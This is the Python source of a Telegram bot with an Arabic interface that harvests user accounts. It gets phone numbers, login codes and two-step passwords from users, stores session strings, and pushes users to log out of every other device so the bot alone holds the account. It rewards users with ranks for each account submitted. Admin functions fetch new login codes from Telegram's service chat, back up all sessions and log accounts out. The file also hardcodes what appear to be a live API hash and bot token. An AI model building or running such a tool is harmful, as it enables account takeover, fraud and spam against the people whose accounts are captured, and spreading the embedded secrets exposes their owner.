import os
from telethon.tl import functions
from telethon.sessions import StringSession
import asyncio
import json
import time
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events, Button
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    AuthKeyUnregisteredError,
    SessionRevokedError,
    BotMethodInvalidError,
    MessageNotModifiedError,
    UserDeactivatedError
)
import datetime

if not os.path.isdir('database'):
    os.mkdir('database')

API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
TOKEN = "7315494223:AAH94iN98Tn72LqvELnq-AvCclnuB9VIPA0"
ADMIN_ID = 7072622935
client = TelegramClient('BotSession0', API_ID, API_HASH).start(bot_token=TOKEN)
bot = client

db = uu('database/elhakem.ss', 'bot')
if not db.exists("accounts"):
    db.set("accounts", [])
if not db.exists("admin_accounts"):
    db.set("admin_accounts", [])
if not db.exists("events"):
    db.set("events", [])
if not db.exists("users"):
    db.set("users", {})
if not db.exists("reports"):
    db.set("reports", {})
if not db.exists("notification_channel"):
    db.set("notification_channel", None)
if not db.exists("retry_counts"):
    db.set("retry_counts", {})
if not db.exists("banned_countries"):
    db.set("banned_countries", [])

RANKS = ["مبتدئ 🌱", "مشارك 🏅", "متقدم 🌟", "خبير 🧠", "متميز 🏆", "محترف 🎖", "ماهر 🥇", "مبدع 💡", "عبقري 🚀", "أسطورة 🌐"]

start_time = time.time()

def log_event(action, user, details=""):
    events = db.get("events")
    user_link = f"[{user}](tg://user?id={user})"
    events.append({"action": action, "user": user_link, "details": details})
    db.set("events", events)

def update_main_buttons(is_admin):
    accounts = db.get("accounts")
    admin_accounts = db.get("admin_accounts")
    accounts_count = len(accounts)
    admin_accounts_count = len(admin_accounts)
    main_buttons = []

    if is_admin:
        main_buttons = [
            [Button.inline("➕ إضافة حساب", data="add_account")],
            [Button.inline(f"📲 حسابات المدير ({admin_accounts_count})", data="your_accounts")],
            [Button.inline(f"📥 الحسابات المستلمة ({accounts_count})", data="received_accounts")],
            [Button.inline("⚙️ قائمة التحكم", data="control_panel")],
            [Button.inline("📢 تعيين قناة الإشعارات", data="set_notification_channel")]
        ]
    else:
        main_buttons = [
            [Button.inline("➕ تسليم حساب", data="submit_account")],
            [Button.inline("🚨 الإبلاغ عن مشكلة", data="report_issue")],
            [Button.url("💬 رابط المطور", url="https://t.me/xx44g")]
        ]

    return main_buttons

def get_user_rank(submitted_count):
    rank_index = min(submitted_count // 5, len(RANKS) - 1)
    return RANKS[rank_index]

@client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    user_id = str(event.chat_id)
    is_admin = int(user_id) == ADMIN_ID

    users = db.get("users")
    if user_id not in users:
        users[user_id] = {"submitted_accounts": []}
        db.set("users", users)
        if notification_channel := db.get("notification_channel"):
            await bot.send_message(
                notification_channel,
                f"👤 مستخدم جديد انضم إلى البوت:\n\n"
                f"🔹 الاسم: [{event.sender.first_name}](tg://user?id={user_id})\n"
                f"🆔 المعرف: {user_id}\n\n"
                f"📊 أصبح عدد مستخدمي البوت الآن: {len(users)}"
            )

    user_data = users.get(user_id, {"submitted_accounts": []})
    submitted_count = len(user_data.get("submitted_accounts", []))
    user_rank = get_user_rank(submitted_count)
    user_name = (await client.get_entity(int(user_id))).first_name

    if is_admin:
        welcome_text = (
            "👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله:"
        )
    else:
        welcome_text = (
            f"👋 أهلاً بك، {user_name}!\n\n"
            f"🔢 لقد قمت بتسليم {submitted_count} حساب{'ات' if submitted_count != 1 else ''} حتى الآن.\n"
            f"🔰 رتبتك الحالية: {user_rank}\n\n"
            "استخدم الأزرار أدناه للتفاعل مع البوت وتسليم حساباتك بسهولة وأمان."
        )

    await event.reply(welcome_text, buttons=update_main_buttons(is_admin))

inactive_accounts_global = []

@client.on(events.callbackquery.CallbackQuery())
async def callback_handler(event):
    global inactive_accounts_global
    try:
        data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
        user_id = str(event.chat_id)
        accounts = db.get("accounts")
        admin_accounts = db.get("admin_accounts")
        users = db.get("users")
        reports = db.get("reports")
        notification_channel = db.get("notification_channel")
        retry_counts = db.get("retry_counts")
        banned_countries = db.get("banned_countries")

        def create_page_buttons(page, total_pages, accounts_info):
            buttons = []
            start = page * page_size
            end = start + page_size
            for account_info in accounts_info[start:end]:
                buttons.append([Button.inline(account_info, data="noop")])
            if page > 0:
                buttons.append([Button.inline("⬅️ السابق", data=f"check_all_page_{page - 1}")])
            if page < total_pages - 1:
                buttons.append([Button.inline("➡️ التالي", data=f"check_all_page_{page + 1}")])
            buttons.append([Button.inline("🔙 رجوع", data="control_panel")])
            return buttons

        if data == "back":
            is_admin = int(user_id) == ADMIN_ID
            user_data = users.get(user_id, {"submitted_accounts": []})
            submitted_count = len(user_data.get("submitted_accounts", []))
            user_rank = get_user_rank(submitted_count)
            user_name = (await client.get_entity(int(user_id))).first_name

            welcome_text = (
                "👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله:"
            )

            await event.edit(welcome_text, buttons=update_main_buttons(is_admin))

        elif data == "submit_account":
            async with bot.conversation(event.chat_id) as x:
                await x.send_message(
                    "⚠️ **يرجى التأكد من تسجيل الخروج من جميع الجلسات الأخرى على حسابك.**\n\n"
                    "💡 **يجب أن يكون البوت هو الوحيد المتصل لإتمام عملية التسليم بنجاح.**\n\n"
                    "✔️ **أرسل رقم هاتفك مع رمز الدولة، مثال: +201000000000**"
                )
                txt = await x.get_response()
                phone_number = txt.text.replace("+", "").replace(" ", "")

                if any(phone_number.startswith(banned[1:]) for banned in banned_countries):
                    await x.send_message("❌ نحن لا نقبل أرقام لهذه الدولة حالياً.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return
                
                if any(account['phone_number'] == phone_number for account in accounts):
                    await x.send_message("❌ هذا الحساب موجود بالفعل في تخزين المسؤول.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return

                app = TelegramClient(StringSession(), API_ID, API_HASH)
                await app.connect()
                password = None
                try:
                    await app.send_code_request(phone_number)
                except (ApiIdInvalidError, PhoneNumberInvalidError):
                    await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                    return

                await x.send_message("🔑 تم إرسال كود التحقق الخاص بك على تيليجرام. أرسل الكود بالتنسيق التالي: 12345")
                txt = await x.get_response()
                code = txt.text.replace(" ", "")
                try:
                    await app.sign_in(phone_number, code)

                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_count = len(sessions.authorizations)
                    user_data = db.get("users").get(user_id, {"submitted_accounts": []})
                    user_data["submitted_accounts"].append(phone_number)
                    db.set("users", {**users, user_id: user_data})

                    accounts.append({"phone_number": phone_number, "session": app.session.save(), "user_id": user_id})
                    db.set("accounts", accounts)

                    await x.send_message(
                        f"📞 **رقم الهاتف**: `{phone_number}`\n"
                        f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                        "👀 قم بالتحقق من كون البوت هو الوحيد المتصل بالحساب.\n",
                        buttons=[[Button.inline("✅ تحقق", data=f"verify_session_{phone_number}")]]
                    )

                except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                    await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return
                except SessionPasswordNeededError:
                    await x.send_message("🔐 أرسل رمز التحقق بخطوتين الخاص بحسابك.")
                    txt = await x.get_response()
                    password = txt.text
                    try:
                        await app.sign_in(password=password)

                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)
                        accounts.append({"phone_number": phone_number, "session": app.session.save(), "two_step": True, "user_id": user_id})
                        db.set("accounts", accounts)

                        await x.send_message(
                            f"📞 **رقم الهاتف**: `{phone_number}`\n"
                            f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                            "👀 قم بالتحقق من كون البوت هو الوحيد المتصل بالحساب.\n",
                            buttons=[[Button.inline("✅ تحقق", data=f"verify_session_{phone_number}")]]
                        )

                    except PasswordHashInvalidError:
                        await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                        return

        elif data.startswith("verify_session_"):
            phone_number = data.split("_")[2]
            retry_counts = db.get("retry_counts")
            current_retry_count = retry_counts.get(phone_number, 0) + 1
            retry_counts[phone_number] = current_retry_count
            db.set("retry_counts", retry_counts)

            for account in accounts:
                if phone_number == account['phone_number']:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)
                        
                        if device_count == 1:
                            accounts.remove(account)
                            admin_accounts.append(account)
                            db.set("accounts", accounts)
                            db.set("admin_accounts", admin_accounts)
                            log_event("تسليم حساب", str(event.chat_id), f"رقم الهاتف: {phone_number}")

                            await event.edit(
                                f"✅ تم التحقق وإضافة الحساب بنجاح!\n"
                                f"📞 **رقم الهاتف**: `{phone_number}`\n",
                                buttons=[[Button.inline("🔙 رجوع", data="back")]]
                            )

                            if notification_channel:
                                masked_phone = phone_number[:3] + "****" + phone_number[-3:]
                                two_step_status = "مفعل" if 'two_step' in account else "غير مفعل"
                                await bot.send_message(
                                    notification_channel,
                                    f"🚀 **تم إضافة حساب جديد**:\n"
                                    f"👤 **المستخدم**: [{event.chat_id}](tg://user?id={event.chat_id})\n"
                                    f"📞 **رقم الهاتف**: `{masked_phone}`\n"
                                    f"📱 **عدد الأجهزة المتصلة**: {device_count}\n"
                                    f"🔒 **التحقق بخطوتين**: {two_step_status}"
                                )
                        else:
                            await event.edit(
                                f"❌ لا يزال هناك جلسات أخرى متصلة. عدد الأجهزة المتصلة حاليًا: {device_count}.\n"
                                f"لقد قمت بإعادة المحاولة ({current_retry_count}) حتى الآن.",
                                buttons=[
                                    [Button.inline("🔄 تحقق مرة أخرى", data=f"verify_session_{phone_number}")]
                                ]
                            )
                    except SessionRevokedError:
                        await handle_session_revoked(phone_number, event)
                    finally:
                        await app.disconnect()
                    break

        elif data == "report_issue":
            last_report_time = reports.get(user_id, 0)
            current_time = time.time()
            
            if current_time - last_report_time < 7200:
                await event.answer("❌ لا يمكنك الإبلاغ عن مشكلة أخرى الآن. حاول مرة أخرى لاحقًا.", alert=True)
                return
            
            async with bot.conversation(event.chat_id) as x:
                await x.send_message("📝 يرجى وصف المشكلة التي تواجهها:")
                report = await x.get_response()
                report_text = report.text

                if notification_channel:
                    await bot.send_message(notification_channel, f"🚨 **تقرير مشكلة جديدة**:\n\nالمستخدم: [{user_id}](tg://user?id={user_id})\nالمشكلة: {report_text}")
                reports[user_id] = current_time
                db.set("reports", reports)

                await x.send_message("✅ تم إرسال تقرير المشكلة إلى المسؤول. شكرًا لك!", buttons=[[Button.inline("🔙 رجوع", data="back")]])

        elif data == "add_account":
            if int(user_id) != ADMIN_ID:
                await event.answer("❌ هذا الخيار متاح للمسؤول فقط.", alert=True)
                return

            async with bot.conversation(event.chat_id) as x:
                await x.send_message("✔️ الآن أرسل رقم الهاتف لإضافته، مثال: +201000000000")
                txt = await x.get_response()
                phone_number = txt.text.replace("+", "").replace(" ", "")

                app = TelegramClient(StringSession(), API_ID, API_HASH)
                await app.connect()
                password = None
                try:
                    await app.send_code_request(phone_number)
                except (ApiIdInvalidError, PhoneNumberInvalidError):
                    await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                    return

                await x.send_message("🔑 تم إرسال كود التحقق الخاص بك على تيليجرام. أرسل الكود بالتنسيق التالي: 12345")
                txt = await x.get_response()
                code = txt.text.replace(" ", "")
                try:
                    await app.sign_in(phone_number, code)

                    admin_accounts.append({"phone_number": phone_number, "session": app.session.save()})
                    db.set("admin_accounts", admin_accounts)
                    log_event("إضافة حساب", user_id, f"رقم الهاتف: {phone_number}")
                    await x.send_message("✅ تم إضافة الحساب بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="back")]])

                except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                    await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return
                except SessionPasswordNeededError:
                    await x.send_message("🔐 أرسل رمز التحقق بخطوتين الخاص بالحساب.")
                    txt = await x.get_response()
                    password = txt.text
                    try:
                        await app.sign_in(password=password)

                        admin_accounts.append({"phone_number": phone_number, "session": app.session.save(), "two_step": True})
                        db.set("admin_accounts", admin_accounts)
                        log_event("إضافة حساب", user_id, f"رقم الهاتف: {phone_number} مع تحقق بخطوتين")
                        await x.send_message("✅ تم إضافة الحساب بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    except PasswordHashInvalidError:
                        await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                        return

        elif data == "your_accounts":
            if len(admin_accounts) == 0:
                await event.edit("❌ لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return

            account_buttons = [[Button.inline(f"📱 {i['phone_number']}", data=f"get_admin_{i['phone_number']}")] for i in admin_accounts]
            account_buttons.append([Button.inline("🔙 رجوع", data="back")])
            await event.edit("📜 اختر الحساب لإدارة الخيارات:", buttons=account_buttons)

        elif data.startswith("get_admin_"):
            phone_number = data.split("_")[2]
            for i in admin_accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    try:
                        await app.connect()
                        me = await app.get_me()
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)

                        text = f"📞 رقم الهاتف: `{phone_number}`\n" \
                               f"👤 الاسم: ◂ {me.first_name} {me.last_name or ''}\n" \
                               f"📱 عدد الأجهزة المتصلة: {device_count}\n" \
                               f"🔒 تحقق بخطوتين: {'نعم' if 'two_step' in i else 'لا'}\n"

                        account_action_buttons = [
                            [Button.inline("🔒 تسجيل خروج", data=f"logout_admin_{phone_number}")],
                            [Button.inline("📩 جلب آخر كود", data=f"code_admin_{phone_number}")],
                            [Button.inline("🔙 رجوع", data="your_accounts")]
                        ]
                        await event.edit(text, buttons=account_action_buttons)
                    except (SessionRevokedError, AuthKeyUnregisteredError):
                        await handle_session_revoked(phone_number, event)
                    finally:
                        await app.disconnect()
                    break

        elif data == "received_accounts":
            if len(accounts) == 0:
                await event.edit("❌ لا توجد حسابات مستلمة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return

            received_buttons = [[Button.inline(f"📥 {i['phone_number']}", data=f"get_received_{i['phone_number']}")] for i in accounts]
            received_buttons.append([Button.inline("🔙 رجوع", data="back")])
            await event.edit("📥 اختر الحساب المستلم لإدارة الخيارات:", buttons=received_buttons)

        elif data.startswith("get_received_"):
            phone_number = data.split("_")[2]
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    try:
                        await app.connect()
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)

                        text = f"📞 **رقم الهاتف**: `{phone_number}`\n" \
                               f"📱 **عدد الأجهزة المتصلة**: {device_count}\n"

                        account_action_buttons = [
                            [Button.inline("🔒 تسجيل خروج", data=f"logout_received_{phone_number}")],
                            [Button.inline("📩 جلب آخر كود", data=f"code_received_{phone_number}")],
                            [Button.inline("🔙 رجوع", data="received_accounts")]
                        ]
                        await event.edit(text, buttons=account_action_buttons)
                    except (SessionRevokedError, AuthKeyUnregisteredError):
                        await handle_session_revoked(phone_number, event)
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("logout_admin_") or data.startswith("logout_received_"):
            phone_number = data.split("_")[-1]
            for i in admin_accounts + accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        await app.log_out()
                        if i in admin_accounts:
                            admin_accounts.remove(i)
                            db.set("admin_accounts", admin_accounts)
                        else:
                            accounts.remove(i)
                            db.set("accounts", accounts)

                        log_event("تسجيل خروج", user_id, f"رقم الهاتف: {phone_number}")
                        await event.edit(f"✅ تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("code_admin_") or data.startswith("code_received_"):
            phone_number = data.split("_")[-1]
            for i in admin_accounts + accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        code = await app.get_messages(777000, limit=1)
                        code_number = code[0].message.strip().split(':')[1].split('.')[0].strip()
                        await event.edit(f"📩 آخر كود تم استلامه: `{code_number}`", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    except IndexError:
                        await event.edit("❌ لا يوجد كود تحقق متاح حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    finally:
                        await app.disconnect()
                    break

        elif data == "control_panel":
            control_buttons = [
                [Button.inline("💾 إنشاء نسخة احتياطية", data="backup")],
                [Button.inline("📂 استعادة نسخة احتياطية", data="restore")],
                [Button.inline("🗑️ حذف جميع الأحداث", data="delete_all_events")],
                [Button.inline("🔍 فحص الكل", data="check_all")],
                [Button.inline("📊 الإحصائيات", data="statistics")],
                [Button.inline("🔄 تصفير الإحصائيات", data="reset_stats")],
                [Button.inline("📰 الأحداث", data="events")],
                [Button.inline("🚫 منع دولة", data="ban_country")],
                [Button.inline("🌍 الدول الممنوعة", data="view_banned_countries")],
                [Button.inline("🔙 رجوع", data="back")]
            ]
            await event.edit("⚙️ إليك قائمة التحكم:", buttons=control_buttons)

        elif data == "set_notification_channel":
            async with bot.conversation(event.chat_id) as x:
                await x.send_message("👥 أرسل معرف القناة لتعيينها كقناة إشعارات:")
                response = await x.get_response()
                channel_id = response.text.strip()
                db.set("notification_channel", channel_id)
                await x.send_message(f"📢 تم تعيين قناة الإشعارات إلى: {channel_id}", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "delete_all_events":
            db.set("events", [])
            await event.edit("🗑️ تم حذف جميع الأحداث بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "reset_stats":
            db.set("events", [])
            db.set("users", {})
            await event.edit("✅ تم تصفير الإحصائيات بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "check_all":
            all_accounts = accounts + admin_accounts
            if not all_accounts:
                await event.edit("🔍 لا توجد حسابات للفحص.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])
                return

            await event.edit("🔍 جاري الفحص...")
            active_accounts = []
            inactive_accounts_global = []

            async def check_account(account):
                app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                try:
                    await app.connect()
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_count = len(sessions.authorizations)
                    active_accounts.append(f"📞 {account['phone_number']} - 📱 {device_count} أجهزة")
                except (AuthKeyUnregisteredError, SessionRevokedError, UserDeactivatedError):
                    inactive_accounts_global.append(account['phone_number'])
                finally:
                    await app.disconnect()

            batch_size = 10
            for i in range(0, len(all_accounts), batch_size):
                tasks = [check_account(account) for account in all_accounts[i:i + batch_size]]
                await asyncio.gather(*tasks)

            for start in range(0, len(active_accounts), 20):
                await bot.send_message(
                    int(user_id),
                    "🟢 **الحسابات الشغالة**:\n" + "\n".join(active_accounts[start:start+20])
                )

            for start in range(0, len(inactive_accounts_global), 20):
                await bot.send_message(
                    int(user_id),
                    "🔴 **الحسابات المفقودة**:\n" + "\n".join(inactive_accounts_global[start:start+20]),
                    buttons=[[Button.inline("🗑️ إزالة من القائمة", data="remove_inactive_accounts")]]
                )

            await event.edit("✅ تم الفحص بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "remove_inactive_accounts":
            accounts = [acc for acc in accounts if acc['phone_number'] not in inactive_accounts_global]
            admin_accounts = [acc for acc in admin_accounts if acc['phone_number'] not in inactive_accounts_global]
            db.set("accounts", accounts)
            db.set("admin_accounts", admin_accounts)
            await event.edit("🗑️ تم إزالة الحسابات المفقودة من القائمة.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "backup":
            backup_data = {"accounts": accounts, "admin_accounts": admin_accounts, "users": users, "notification_channel": notification_channel}
            with open(f"database/backup.json", "w") as backup_file:
                json.dump(backup_data, backup_file)
            await bot.send_file(int(user_id), f"database/backup.json", caption="✅ تم إنشاء نسخة احتياطية بنجاح!\n\n" \
                f"عدد الحسابات المخزنة: {len(accounts)}\n" \
                f"عدد حسابات المدير: {len(admin_accounts)}\n" \
                "⚠️ يجب عليك الاحتفاظ بملف النسخة الاحتياطية وعدم مشاركته مع أي شخص!")

        elif data == "restore":
            async with bot.conversation(event.chat_id) as x:
                await x.send_message("📂 أرسل ملف النسخة الاحتياطية (backup.json)")
                response = await x.get_response()
                if response.file and response.file.name == "backup.json":
                    await bot.download_media(response, f"database/backup.json")
                    with open(f"database/backup.json", "r") as backup_file:
                        backup_data = json.load(backup_file)
                    db.set("accounts", backup_data["accounts"])
                    db.set("admin_accounts", backup_data["admin_accounts"])
                    db.set("users", backup_data["users"])
                    db.set("notification_channel", backup_data.get("notification_channel"))
                    restored_count = len(backup_data["accounts"]) + len(backup_data["admin_accounts"])
                    log_event("استعادة نسخة احتياطية", user_id, f"عدد الحسابات: {restored_count}")
                    await x.send_message(f"✅ تم استعادة النسخة الاحتياطية بنجاح!\n\n" \
                        f"عدد الحسابات المستعادة: {restored_count}", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "statistics":
            await event.edit("جاري جلب الإحصائيات...")
            await asyncio.sleep(1)

            user_stats = sorted(users.items(), key=lambda x: len(x[1].get("submitted_accounts", [])), reverse=True)
            top_users = user_stats[:10]
            today_users = [user for user, data in users.items() if "joined_today" in data]
            total_users = len(users)
            total_reports = len(reports)
            total_events = len(db.get("events"))
            total_received_accounts = len(accounts)

            last_received_accounts = accounts[-5:] if len(accounts) > 5 else accounts

            stats_text = "📊 **إحصائيات الحسابات والمستخدمين**:\n\n"
            stats_text += f"👥 **إجمالي المستخدمين المسجلين**: {total_users}\n"
            stats_text += f"📨 **إجمالي التقارير المقدمة**: {total_reports}\n"
            stats_text += f"📰 **إجمالي الأحداث المسجلة**: {total_events}\n"
            stats_text += f"📥 **إجمالي الحسابات المستلمة**: {total_received_accounts}\n\n"

            stats_text += "🏆 **أكثر 10 مستخدمين قاموا بتسليم حسابات**:\n"
            for idx, (user_id, user_data) in enumerate(top_users, start=1):
                user_name = (await client.get_entity(int(user_id))).first_name
                stats_text += f"{idx}. [{user_name}](tg://user?id={user_id}) - {len(user_data.get('submitted_accounts', []))} حسابات\n"

            stats_text += "\n🆕 **المستخدمون الذين انضموا اليوم**:\n"
            for user_id in today_users:
                user_name = (await client.get_entity(int(user_id))).first_name
                stats_text += f"- [{user_name}](tg://user?id={user_id})\n"
            
            stats_text += "\n📋 **آخر الحسابات المستلمة**:\n"
            for account in last_received_accounts:
                stats_text += f"- {account['phone_number']}\n"
            
            await event.edit(stats_text, buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "events":
            events = db.get("events")
            if not events:
                await event.edit("📰 لا توجد أحداث مسجلة حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])
                return

            events_text = "📰 **الأحداث المسجلة**:\n"
            for e in events[-10:]:
                events_text += f"- {e['user']} قام بـ {e['action']} {e['details']}\n"

            await event.edit(events_text, buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "ban_country":
            async with bot.conversation(event.chat_id) as x:
                await x.send_message("🚫 أرسل رمز الدولة (مثل +20) لمنع استلام الأرقام منها:")
                response = await x.get_response()
                country_code = response.text.strip()
                if country_code.startswith("+") and country_code[1:].isdigit():
                    banned_countries.append(country_code)
                    db.set("banned_countries", banned_countries)
                    await x.send_message(f"✅ تم منع استلام الأرقام من الدولة: {country_code}", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])
                else:
                    await x.send_message("❌ رمز الدولة غير صالح. يرجى المحاولة مرة أخرى.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

        elif data == "view_banned_countries":
            if not banned_countries:
                await event.edit("🌍 لا توجد دول ممنوعة حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])
            else:
                buttons = [[Button.inline(f"🚫 {code}", data=f"unban_{code}")] for code in banned_countries]
                buttons.append([Button.inline("🔙 رجوع", data="control_panel")])
                await event.edit("🌍 **الدول الممنوعة حاليًا**:\n\n" + "\n".join(f"- {code}" for code in banned_countries), buttons=buttons)

        elif data.startswith("unban_"):
            country_code = data.split("_")[1]
            if country_code in banned_countries:
                banned_countries.remove(country_code)
                db.set("banned_countries", banned_countries)
                await event.edit(f"✅ تم إزالة الحظر عن الدولة: {country_code}", buttons=[[Button.inline("🔙 رجوع", data="view_banned_countries")]])

        elif data.startswith("delete_account_"):
            phone_number = data.split("_")[-1]
            accounts = [acc for acc in accounts if acc['phone_number'] != phone_number]
            admin_accounts = [acc for acc in admin_accounts if acc['phone_number'] != phone_number]
            db.set("accounts", accounts)
            db.set("admin_accounts", admin_accounts)
            await event.edit(f"🗑️ تم حذف الحساب `{phone_number}` من القائمة.", buttons=[[Button.inline("🔙 رجوع", data="control_panel")]])

    except MessageNotModifiedError:
        pass

async def handle_session_revoked(phone_number, event):
    retry_counts = db.get("retry_counts")
    current_retry_count = retry_counts.get(phone_number, 0) + 1
    retry_counts[phone_number] = current_retry_count
    db.set("retry_counts", retry_counts)

    await event.edit(
        f"فقدان الوصول إلى الحساب `{phone_number}`. قد يكون تم حظره من شركة تليجرام أو تمت إزالة البوت منه.\n"
        f"يرجى التحقق قبل حذفه من القائمة. لقد حاولت حتى الآن ({current_retry_count}) مرات.",
        buttons=[
            [Button.inline("حذف من القائمة", data=f"delete_account_{phone_number}")],
            [Button.inline("إعادة المحاولة", data=f"verify_session_{phone_number}")],
            [Button.inline("🔙 رجوع", data="back")]
        ]
    )

client.run_until_disconnected()